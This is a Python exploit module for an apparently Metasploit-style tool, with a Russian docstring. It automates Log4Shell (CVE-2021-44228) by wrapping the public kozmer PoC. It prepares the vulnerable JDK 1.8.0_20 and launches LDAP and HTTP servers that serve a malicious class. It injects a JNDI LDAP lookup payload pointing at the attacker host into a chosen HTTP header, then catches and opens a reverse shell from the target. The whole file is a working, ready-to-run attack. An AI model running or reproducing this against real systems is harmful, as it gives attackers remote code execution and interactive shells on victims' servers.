"""Log4Shell (CVE-2021-44228) — обёртка над kozmer/log4j-shell-poc.

ТРЕБОВАНИЯ:

    git, python3, venv

    JDK 1.8.0_20 (именно эта версия нужна для загрузки удалённых классов;
    более новые JDK блокируют trustURLCodebase).

    Целевой JVM должен разрешать remote class loading.
"""
import os
from pathlib import Path
import queue
import re
import shutil
import subprocess
import time
import urllib.error
import urllib.request
from urllib.parse import urljoin

from framework import Module, C
from poc_support import (
    check_free_ports, ensure_repo, python_environment, run_checked,
    stop_process, wait_for_ports,
)

POC_REPO = "https://github.com/kozmer/log4j-shell-poc.git"
WORK_DIR = Path.home() / ".rce-tool" / "log4j-shell-poc"
REQUIRED_JAVA = "1.8.0_20"


class Log4Shell(Module):
    name = "log4shell"
    description = "CVE-2021-44228 Log4j JNDI RCE (kozmer PoC, требует JDK 1.8.0_20)"
    author = "you"

    options = {
        "TARGET": {"value": None, "required": True, "kind": "url", "description": "Target HTTP(S) URL"},
        "ENDPOINT": {"value": "/", "required": False, "description": "Path relative to TARGET, e.g. /login"},
        "LHOST": {"value": None, "required": True, "description": "Your IPv4/hostname, reachable from target"},
        "LPORT": {"value": "4444", "required": True, "description": "Reverse-shell port"},
        "HEADER": {"value": "User-Agent", "required": False, "description": "HTTP header to inject"},
        "WEBPORT": {"value": "8000", "required": False, "description": "HTTP port for Exploit.class"},
        "JAVA": {"value": None, "required": False, "description": "java path; default: PoC JDK, then PATH"},
        "JAVAC": {"value": None, "required": False, "description": "javac path from the same JDK"},
        "TIMEOUT": {"value": "60", "required": False, "description": "Seconds to wait for a connection"},
    }

    def validate(self):
        errors = super().validate()
        if not errors:
            if len({int(self.get("LPORT")), int(self.get("WEBPORT")), 1389}) != 3:
                errors.append("LPORT, WEBPORT and LDAP port 1389 must be different")
        header = self.get("HEADER")
        if header and not re.fullmatch(r"[!#$%&'*+.^_`|~0-9A-Za-z-]+", header):
            errors.append("HEADER: invalid HTTP header name")
        endpoint = self.get("ENDPOINT")
        if endpoint and ("://" in endpoint or endpoint.startswith("//")):
            errors.append("ENDPOINT: expected a path, not another host")
        return errors

    def _prepare_java(self):
        if os.name != "posix":
            raise RuntimeError("This upstream Log4Shell PoC requires a POSIX host")
        expected = WORK_DIR / "jdk1.8.0_20"
        binaries = []
        for option, binary in (("JAVA", "java"), ("JAVAC", "javac")):
            configured = self.get(option)
            bundled = expected / "bin" / binary
            candidate = configured or (str(bundled) if bundled.is_file() else binary)
            located = shutil.which(str(candidate))
            if not located:
                raise RuntimeError(
                    f"{binary} not found. Set {option} to JDK {REQUIRED_JAVA}, "
                    f"or place that JDK at {expected}"
                )
            path = Path(located).resolve()
            result = run_checked([path, "-version"], capture_output=True, timeout=10)
            version = re.search(r'(?:version\s+"?|javac\s+)([\w.+-]+)',
                                (result.stdout or "") + (result.stderr or ""))
            if not version or version.group(1) != REQUIRED_JAVA:
                actual = version.group(1) if version else "unknown"
                raise RuntimeError(f"{binary}: expected {REQUIRED_JAVA}, found {actual}")
            binaries.append(path)
        jdk = binaries[0].parent.parent
        if binaries[1].parent.parent != jdk:
            raise RuntimeError("JAVA and JAVAC must belong to the same JDK")
        if expected.exists() or expected.is_symlink():
            if expected.resolve() != jdk:
                raise RuntimeError(
                    f"PoC already uses {expected}; configured JDK is {jdk}. "
                    "Use matching JAVA/JAVAC paths or move the old JDK aside."
                )
        else:
            expected.symlink_to(jdk, target_is_directory=True)
        print(f"{C.G}[+] PoC JDK: {jdk} ({REQUIRED_JAVA}){C.END}")

    def run(self):
        errors = self.validate()
        if errors:
            raise ValueError("; ".join(errors))
        ensure_repo(POC_REPO, WORK_DIR, "poc.py")
        self._prepare_java()
        python = python_environment(WORK_DIR)
        lh = self.get("LHOST")
        lp, web = int(self.get("LPORT")), int(self.get("WEBPORT"))
        check_free_ports([web, 1389])
        # Bind before starting the PoC or sending any triggering request.
        listener = self.sessions.listen(port=lp)
        process = None
        try:
            command = [python, "poc.py", "--userip", lh,
                       "--webport", str(web), "--lport", str(lp)]
            process = subprocess.Popen(command, cwd=WORK_DIR, start_new_session=True)
            wait_for_ports(process, [web, 1389])
            target = self.get("TARGET").rstrip("/") + "/"
            url = urljoin(target, self.get("ENDPOINT").lstrip("/"))
            header = self.get("HEADER")
            jndi = f"${{jndi:ldap://{lh}:1389/a}}"
            print(f"{C.Y}[*] Sending request to {url}{C.END}")
            try:
                request = urllib.request.Request(url, headers={header: jndi})
                with urllib.request.urlopen(request, timeout=5):
                    pass
            except (urllib.error.URLError, TimeoutError, OSError) as exc:
                # An HTTP error can still have logged the header.
                print(f"{C.DIM}[*] HTTP result: {exc}{C.END}")
            timeout = int(self.get("TIMEOUT"))
            print(f"{C.Y}[*] Waiting on port {lp} ({timeout}s)...{C.END}")
            deadline = time.monotonic() + timeout
            while True:
                try:
                    session = listener.wait(timeout=0.2)
                    break
                except queue.Empty:
                    if process.poll() is not None:
                        raise RuntimeError(f"PoC exited with code {process.returncode}")
                    if time.monotonic() >= deadline:
                        raise RuntimeError(f"No connection in {timeout}s")
            session.interact()
        finally:
            try:
                self.sessions.stop_listener(listener.id)
            finally:
                if process is not None:
                    stop_process(process)
            print(f"{C.Y}[*] PoC stopped; detached sessions remain available.{C.END}")
